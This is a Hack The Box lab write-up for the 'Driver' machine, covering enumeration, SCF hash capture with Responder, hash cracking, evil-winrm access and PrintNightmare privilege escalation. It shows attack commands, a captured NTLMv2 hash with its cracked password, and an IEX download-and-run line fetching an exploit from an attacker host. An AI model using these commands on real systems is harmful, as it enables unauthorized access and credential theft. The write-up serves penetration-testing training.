# Driver

## Enumeration

### nmap

```
PORT    STATE SERVICE      REASON  VERSION
80/tcp  open  http         syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
445/tcp open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-11-16T06:45:20
|_  start_date: 2021-11-16T06:30:11
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 7h17m59s, deviation: 0s, median: 7h17m59s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 39061/tcp): CLEAN (Timeout)
|   Check 2 (port 18115/tcp): CLEAN (Timeout)
|   Check 3 (port 26928/udp): CLEAN (Timeout)
|   Check 4 (port 37846/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```

Basically a windows machine with a web server, visiting the website requires admin creds

RPC open on port 135...lets do Rpc enumeration

```
$rpcdump.py 10.10.11.106
Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

[*] Retrieving endpoint list from 10.10.11.106
Protocol: [MS-RSP]: Remote Shutdown Protocol
Provider: wininit.exe
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0
Bindings:
ncacn_ip_tcp:10.10.11.106[49408]
ncalrpc:[WindowsShutdown]
ncacn_np:\\DRIVER[\PIPE\InitShutdown]
ncalrpc:[WMsgKRpc07AEA0]
...
```

There was 445 endpoints so for readability I put it in a separate file called `rpcdump.txt`

Back to the website it says: “MFP Firmware Update Center. Please enter password for admin”

Defaults creds work lol

`admin : admin`

After login we see a printer

In Firmware updates page we can uplaod files (upload Firmware)

As samba open those are probably saved in the shares

After some research (google) I discovered [SCF file attacks](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

we create an exploit named `@exploit.scf`

we start a responder to capture hashes  
`sudo responder -wrf --lm -v -I tun0`

I had issues with tun0 interface because of my network configuration, as I am on virtualbox (Nat network + vpn from guest)

But eventually after clicking on submit button we get the following:

```
[SMB] NTLMv2 Client : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash : tony::DRIVER:6f09da70e73b9237:674092FE6EC25CB23CBB01D554A9B854:0101000000000000DEB3B39E53B8D70144991278610991070000000002000400270027000000000000000000
```

Crack the hash with john+rockyou

```
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony (tony)
1g 0:00:00:00 DONE (2021-10-03 00:42) 10.00g/s 327680p/s 327680c/s 327680C/s softball27..eatme1
```

So creds are `tony : liltony`

we connect with evil-winrm  
`evil-winrm -i 10.10.11.106 -u tony -p liltony`

USER FLAG  
`_Evil-WinRM_ PS C:\Users\tony\Desktop> type user.txt`

## Privileges Escalation

rpcdump show us the printer is enabled so `spool service` runs...we use [printNighmare](https://github.com/outflanknl/PrintNightmare) exploit

we upload the file with evil-winrm
`upload CVE-2021-1675.ps1`

But we cannot import it

````
File C:\Users\tony\Desktop\cve-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1

- Import-Module .\cve-2021-1675.ps1
- ```

  ```

- CategoryInfo : SecurityError: (:) [Import-Module], PSSecurityException
- FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
````

we can bypass that with the help of download the file with help of `IEX` command

we start a python server where the exploit is and download with IEX on evil-winrm

```
IEX(New-Object Net.Webclient).downloadstring('http://10.10.15.45:4444/CVE-2021-1675.ps1') //used port 4444 for server because 80 was busy (had another server)
```

Then we invoke it and choose our creds

```
Invoke-Nightmare -NewUser "nairolf" -NewPassword "nairolf"

[+] added user nairolf as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

Now we are admin...lets connect as such  
`evil-winrm -i 10.10.11.106 -u nairolf -p nairolf`

ROOT FLAG  
`_Evil-WinRM_ PS C:\Users\Administrator\Desktop> type root.txt`

This room was anything but easy...htb got a problem rating their boxes
